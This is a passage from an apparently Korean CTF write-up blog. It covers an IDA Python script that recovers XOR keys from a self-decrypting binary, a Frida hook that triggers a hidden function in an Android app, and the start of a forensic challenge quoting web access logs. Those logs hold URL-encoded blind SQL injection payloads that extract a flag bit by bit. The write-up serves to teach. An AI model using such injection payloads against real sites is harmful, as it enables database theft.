<center>[그림 4] 함수 중간 중간 존재하는 더미코드</center>

<ul>
  <li>함수의 내용은 모두 같지만, 중간 중간 더미코드가 혼란을 주고 있다.
더미코드의 영향을 받지 않으면서 공통된 어셈블리 코드를 찾아야한다.</li>
</ul>

<p><img src="/assets/bob/16_common.png" alt="/assets/bob/16_common.png" /></p>
<center>[그림 5] 공통된 strlen 기능 코드</center>

<ul>
  <li>strlen 기능의 코드 덕분에 무려 58바이트의 공통 코드를 찾을 수 있다.
<strong>**마지막 cmp 명령의 글자수(0x07) 비교 전 까지 58 바이트</strong>*</li>
</ul>

<p><img src="/assets/bob/17_scan.png" alt="/assets/bob/17_scan.png" /></p>
<center>[그림 6] 공통 코드 메모리 검색 결과</center>

<ul>
  <li>현재 Flag 출력 외 11개 함수가 복호화되어있다. 공통 코드를 검색한 결과 또한 11개다.
이를 활용하여 입력 값 추출 자동화를 수행할 수 있다.</li>
  <li>아래와 같은 내용을 토대로 자동화 코드를 작성하였다.
    <ol>
      <li>디스어셈블러를 통해, cmp 명령어에서 비교할 입력 값을 구한다.</li>
      <li>이후 sub 명령어에서 Xor 연산 시작 주소를 구한다.</li>
      <li>알려진 5바이트를 통해, 입력 값의 첫 5글자를 획득한다.</li>
      <li>첫 5글자를 패치 대상 데이터와 Xor 연산하고, 공통 코드 58바이트에 포함되는지 확인한다.</li>
      <li>포함될 경우 입력 값을 추출할 수 있다.</li>
      <li>디스어셈블러, 코드 패치 기능을 수행할 수 있는 IDA Python을 사용하여 작성한다.</li>
    </ol>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>
<span class="n">p32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;L"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>

<span class="c1"># patch_xor : Xor 연산을 통해 패치를 수행하는 함수
</span><span class="k">def</span> <span class="nf">patch_xor</span><span class="p">(</span><span class="n">addr_patch</span><span class="p">,</span> <span class="n">addr_end</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">):</span>
    <span class="n">size_patch</span> <span class="o">=</span> <span class="n">addr_end</span> <span class="o">-</span> <span class="n">addr_patch</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">size_patch</span><span class="p">):</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">addr_patch</span> <span class="o">+</span> <span class="n">i</span>
        <span class="n">idc</span><span class="p">.</span><span class="n">PatchByte</span><span class="p">(</span><span class="n">cur</span><span class="p">,</span> <span class="n">idc</span><span class="p">.</span><span class="n">Byte</span><span class="p">(</span><span class="n">cur</span><span class="p">)</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">xor_key</span><span class="p">)])</span>
        <span class="c1"># Xor 연산한 데이터를 패치하여 반영
</span>        <span class="n">idc</span><span class="p">.</span><span class="n">MakeUnknown</span><span class="p">(</span><span class="n">cur</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">idc</span><span class="p">.</span><span class="n">DOUNK_SIMPLE</span><span class="p">)</span>
        <span class="c1"># 패치 후 Unknown 형태로 변환하여 잘못된 디스어셈블리 방지
</span>    <span class="k">return</span>

<span class="c1"># xor_data : 단순 Xor 함수
</span><span class="k">def</span> <span class="nf">xor_data</span><span class="p">(</span><span class="n">addr_xor</span><span class="p">,</span> <span class="n">addr_end</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">size_xor</span> <span class="o">=</span> <span class="n">addr_end</span> <span class="o">-</span> <span class="n">addr_xor</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">size_xor</span><span class="p">):</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">addr_xor</span> <span class="o">+</span> <span class="n">i</span>
        <span class="n">result</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">Byte</span><span class="p">(</span><span class="n">cur</span><span class="p">)</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">xor_key</span><span class="p">)])</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="n">addr_start</span> <span class="o">=</span> <span class="mh">0x401000</span>   <span class="c1"># 함수 시작 주소
</span><span class="n">addr_end</span> <span class="o">=</span> <span class="mh">0x42D700</span>     <span class="c1"># 함수 마지막 주소, 길이 계산에 사용
</span>
<span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">keys</span> <span class="o">=</span> <span class="p">[]</span>

<span class="n">cur</span> <span class="o">=</span> <span class="n">addr_start</span>
<span class="k">while</span> <span class="n">cur</span> <span class="o">&lt;</span> <span class="n">addr_end</span><span class="p">:</span>   <span class="c1"># 디스어셈블리를 통해 Key 크기, 패치 주소를 구함
</span>    <span class="n">key_size</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">addr_patch</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">cur</span> <span class="o">&lt;</span> <span class="n">addr_end</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">dis</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">GetDisasm</span><span class="p">(</span><span class="n">cur</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">dis</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"retn"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="c1"># cmp 명령어에서 Key 크기 추출
</span>            <span class="k">if</span> <span class="n">dis</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"cmp"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">dis</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"], 0"</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="n">dis</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">", "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
                <span class="k">if</span> <span class="n">tmp</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"h"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                    <span class="n">key_size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">base</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">key_size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
            <span class="c1"># sub 명령어에서 패치 주소 추출
</span>            <span class="k">if</span> <span class="n">dis</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"sub"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">dis</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"offset"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="n">dis</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"_"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">tmp</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">";"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                    <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">";"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
                <span class="n">addr_patch</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">base</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
            <span class="n">cur</span> <span class="o">+=</span> <span class="n">idc</span><span class="p">.</span><span class="n">ItemSize</span><span class="p">(</span><span class="n">cur</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">break</span>
            
    <span class="k">print</span> <span class="n">cnt</span><span class="p">,</span> <span class="n">key_size</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr_patch</span><span class="p">),</span>
    
    <span class="c1"># Flag 출력 함수의 경우 임의로 Key을 수정
</span>    <span class="k">if</span> <span class="n">cnt</span> <span class="o">==</span> <span class="mi">10</span><span class="p">:</span>
        <span class="n">key_size</span> <span class="o">=</span> <span class="mi">32</span>
        
        <span class="n">tmp</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x454D4E4A</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x07692B4B</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2D0C1A2C</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0E0D100A</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x09090476</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x26065966</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1C103417</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x567C2075</span><span class="p">)</span>
        
        <span class="n">prev_key</span> <span class="o">=</span> <span class="n">xor_key</span><span class="p">[::]</span>
        <span class="n">xor_key</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">key_size</span><span class="p">):</span>
            <span class="n">xor_key</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">tmp</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="n">prev_key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">prev_key</span><span class="p">)])</span>
    
    <span class="c1"># 연산 오류가 있을 시 break
</span>    <span class="k">if</span> <span class="n">key_size</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">addr_patch</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">break</span>
    
    <span class="c1"># Flag 출력 함수가 아닌 경우, Key 추출 수행
</span>    <span class="k">if</span> <span class="n">key_size</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
        <span class="n">known_data</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">]</span> <span class="c1"># 알려진 Hot Patching 5바이트
</span>        <span class="n">xor_key</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="c1"># Hot Patching 5바이트를 통해, Key 첫 5글자 추출
</span>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
            <span class="n">xor_key</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">Byte</span><span class="p">(</span><span class="n">addr_patch</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">known_data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        
        <span class="c1"># 5글자 보다 많을 경우
</span>        <span class="k">if</span> <span class="n">key_size</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
            <span class="n">xor_key</span> <span class="o">+=</span> <span class="p">[</span><span class="mh">0x00</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="n">key_size</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span>

            <span class="c1"># 모르는 글자는 0x00으로 채우고 Xor 연산 수행
</span>            <span class="n">data</span> <span class="o">=</span> <span class="n">xor_data</span><span class="p">(</span><span class="n">addr_patch</span><span class="p">,</span> <span class="n">addr_end</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">)</span>
            
            <span class="c1"># 공통 58바이트 코드
</span>            <span class="n">known_data</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">]</span>
            <span class="n">known_data</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">known_data</span><span class="p">)</span>
            
            <span class="c1"># 공통 58바이트 코드를 통한, Key 전부를 복구
</span>            <span class="n">xor_key</span> <span class="o">=</span> <span class="n">xor_key</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span>
            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">-</span> <span class="n">key_size</span><span class="p">):</span>
                <span class="c1"># 공통 코드와 Xor 수행한 결과를 5바이트씩 비교
</span>                <span class="n">cur_data</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="p">])</span>
                <span class="n">idx</span> <span class="o">=</span> <span class="n">known_data</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">cur_data</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">idx</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>   <span class="c1">#
</span>                    <span class="c1"># 공통 코드의 어느 인덱스부터 Key이 시작 되는지 확인
</span>                    <span class="c1"># (Key 크기, 더미 코드 등에 의해 오프셋이 매번 다르기 때문)
</span>                    <span class="n">org</span> <span class="o">=</span> <span class="n">known_data</span><span class="p">[</span><span class="n">idx</span><span class="o">+</span><span class="mi">5</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">5</span><span class="o">+</span><span class="n">key_size</span><span class="p">]</span>
                    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">key_size</span> <span class="o">-</span> <span class="mi">5</span><span class="p">):</span>
                        <span class="n">xor_key</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">org</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">^</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="o">+</span><span class="n">j</span><span class="p">])</span> <span class="c1">#Key 복구
</span>                    <span class="k">break</span>
            
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">xor_key</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
                <span class="c1"># Flag 출력 함수(11 번째)의 경우 예외로 처리
</span>                <span class="k">if</span> <span class="n">cnt</span> <span class="o">==</span> <span class="mi">9</span><span class="p">:</span>
                    <span class="n">xor_key</span> <span class="o">+=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="s">'r'</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'i'</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'n'</span><span class="p">)]</span> <span class="c1">#mandarin
</span>                <span class="k">else</span><span class="p">:</span>
                    <span class="k">print</span> <span class="s">"Error!!"</span>
                    <span class="n">xor_key</span> <span class="o">+=</span> <span class="p">[</span><span class="mh">0x00</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="n">key_size</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span>
        
    <span class="k">print</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">xor_key</span><span class="p">)</span>
    <span class="n">keys</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">xor_key</span><span class="p">))</span>
    
    
    <span class="n">patch_xor</span><span class="p">(</span><span class="n">addr_patch</span><span class="p">,</span> <span class="n">addr_end</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">)</span>    <span class="c1"># 추출한 Key를 통해 패치 수행
</span>    <span class="n">idc</span><span class="p">.</span><span class="n">MakeCode</span><span class="p">(</span><span class="n">addr_patch</span><span class="p">)</span>                    <span class="c1"># 어셈블리 코드로 변환
</span>    <span class="n">idc</span><span class="p">.</span><span class="n">MakeFunction</span><span class="p">(</span><span class="n">addr_patch</span><span class="p">)</span>                <span class="c1"># 함수화 수행
</span>    
    <span class="n">cur</span> <span class="o">=</span> <span class="n">addr_patch</span>
    <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"solve_key.txt"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>                 <span class="c1"># 추출한 Key를 저장
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">keys</span><span class="p">)):</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">keys</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="/assets/bob/18_flag2.png" alt="/assets/bob/18_flag2.png" /></p>

<center>[그림 7] 두 번째 Flag 획득</center>

<ul>
  <li>Flag 또한 자동으로 연산할 수 있지만, 자동화로 추출한 입력 값을 복사 후 대입하여 획득하였다.</li>
</ul>

<p><br /></p>

<p><br /></p>

<h2 id="easyroid">EASYROID</h2>

<hr />

<p><img src="/assets/bob/bob954.png" alt="/assets/bob/bob954.png" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Easy Android Reversing Challenge
</code></pre></div></div>
<ul>
  <li>
    <p>JAVA 코드를 먼저 살펴보자.</p>

    <p><img src="/assets/bob/bob955.png" alt="/assets/bob/bob955.png" /></p>

    <p><code class="highlighter-rouge">MainActivity</code>가 실행되면 <a href="http://native-lib.so"><code class="highlighter-rouge">libnative-lib.so</code></a>에 정의되어 있는 <code class="highlighter-rouge">stringFromJNI</code> 함수를 호출 한뒤 <code class="highlighter-rouge">setText</code>로 <code class="highlighter-rouge">TextView</code>에 넣어주는 간단한 코드이다.</p>
  </li>
  <li>
    <p><code class="highlighter-rouge">stringFromJNI</code> 함수를 살펴보자.</p>

    <p><img src="/assets/bob/bob956.png" alt="/assets/bob/bob956.png" /></p>

    <p><code class="highlighter-rouge">stringFromJNI</code> 함수는 <code class="highlighter-rouge">Hello BOB9?</code> 문자열을 리턴해준다.</p>
  </li>
</ul>

<p>결국 앱을 실행하면 화면에 <code class="highlighter-rouge">Hello BOB9?</code> 문자열이 출력된요. 실행해서 확인하자.</p>

<p><img src="/assets/bob/bob957.png" alt="/assets/bob/bob957.png" /></p>

<p>빙고!</p>

<p><a href="http://native-lib.so"><code class="highlighter-rouge">libnative-lib.so</code></a>의 Export Table을 살펴보면 <code class="highlighter-rouge">stringFromJNI</code> 함수 이 외 한 가지 함수가 더 존재한다.</p>

<p><img src="/assets/bob/bob958.png" alt="/assets/bob/bob958.png" /></p>

<p>HiddenStage!!!</p>

<p>HiddenStage 함수를 살펴보자.</p>

<p><img src="/assets/bob/bob959.png" alt="/assets/bob/bob959.png" /></p>

<p>BLOWFISH 를 사용해서 특정 값을 Decrypt 하고 Flag를 출력해보자.</p>

<p>따라서 <code class="highlighter-rouge">F0</code>를 BLOWFISH의 키로 <code class="highlighter-rouge">BOB9</code>을 사용해서 Decrypt 해주면 Flag가 나오겠지?</p>

<p>하지만 여기서 <code class="highlighter-rouge">Fake</code>가 존재한다. Init의 마지막 인자는 Key Size인데 7이다.</p>

<p>따서 실제 BLOWFISH의 키 값은 <code class="highlighter-rouge">BOB9\x00\x00\x00</code>!</p>

<p>이런 Fake에 당하지 않으려면 실제로 그대로 실행하는 방법이 있다.</p>

<p>새로운 프로젝트를 만들어서 .so를 끼워넣고 컴파일하는 방법도 있겠지만 Frida를 사용해보자.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">addrStringFromJNI</span> <span class="o">=</span> <span class="nx">Module</span><span class="p">.</span><span class="nx">findExportByName</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Java_jeong_su_bob9_1easy_1android_MainActivity_stringFromJNI</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">addrHiddenStage</span> <span class="o">=</span> <span class="nx">Module</span><span class="p">.</span><span class="nx">findExportByName</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Java_jeong_su_bob9_1easy_1android_MainActivity_HiddenStage</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">HiddenStage</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NativeFunction</span><span class="p">(</span><span class="nx">addrHiddenStage</span><span class="p">,</span> <span class="dl">'</span><span class="s1">int</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">pointer</span><span class="dl">'</span><span class="p">]);</span>

<span class="nx">Interceptor</span><span class="p">.</span><span class="nx">attach</span><span class="p">(</span><span class="nx">addrStringFromJNI</span><span class="p">,</span> <span class="p">{</span>
	<span class="na">onEnter</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">argv</span><span class="p">){</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">arg0</span> <span class="o">=</span> <span class="nx">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="p">},</span>
	<span class="na">onLeave</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">rets</span><span class="p">){</span>
		<span class="nx">rets</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span> <span class="nx">HiddenStage</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">arg0</span><span class="p">)</span> <span class="p">);</span>
	<span class="p">}</span>
<span class="p">});</span>
</code></pre></div></div>

<p>이 스크립트는 stringFromJNI 함수가 호출되면 HiddenStage 함수를 호출하여 리턴을 변경해주는 스크립트이다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">am</span> <span class="nx">start</span> <span class="o">-</span><span class="nx">n</span> <span class="nx">jeong</span><span class="p">.</span><span class="nx">su</span><span class="p">.</span><span class="nx">bob9_easy_android</span><span class="o">/</span><span class="p">.</span><span class="nx">MainActivity</span>
</code></pre></div></div>

<p>그리고 MainActivity를 am 명령어를 사용하여 시작해주면 아래와 같이 플래그를 확인할 수 있다.</p>

<p><img src="/assets/bob/bob960.png" alt="/assets/bob/bob960.png" /></p>

<p><br /></p>

<p><br /></p>

<h1 id="️-forensic">🖥️ FORENSIC</h1>

<h2 id="sql-eyes">SQL Eyes</h2>

<hr />

<p><img src="/assets/bob/bob961.png" alt="/assets/bob/bob961.png" /></p>

<p>Find the leaked data</p>

<ul>
  <li>해당 문제에서는 웹 서버의 access.log 파일이 제공되었다.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=1 HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=2-1 HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=0%7C%7C1-- HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C1%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1" 500 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /archives/ HTTP/1.1" 404 437 "-" "DirBuster-0.12 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C2%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
